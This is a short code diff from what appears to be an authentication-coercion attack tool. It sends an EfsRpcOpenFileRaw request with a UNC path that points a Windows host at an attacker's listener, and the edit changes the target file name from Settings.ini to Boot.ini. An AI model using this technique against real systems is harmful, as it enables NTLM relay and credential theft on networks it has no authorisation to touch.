@@ -131,7 +131,7 @@ class CoerceAuth():
         logging.info("Sending EfsRpcOpenFileRaw!")
         try:
             request = EfsRpcOpenFileRaw()
-            request['fileName'] = '\\\\{}\\c$\\Settings.ini\x00'.format(listener)
+            request['fileName'] = '\\\\{}\\c$\\Boot.ini\x00'.format(listener)
             request['Flag'] = 0
             #request.dump()
             resp = dce.request(request)
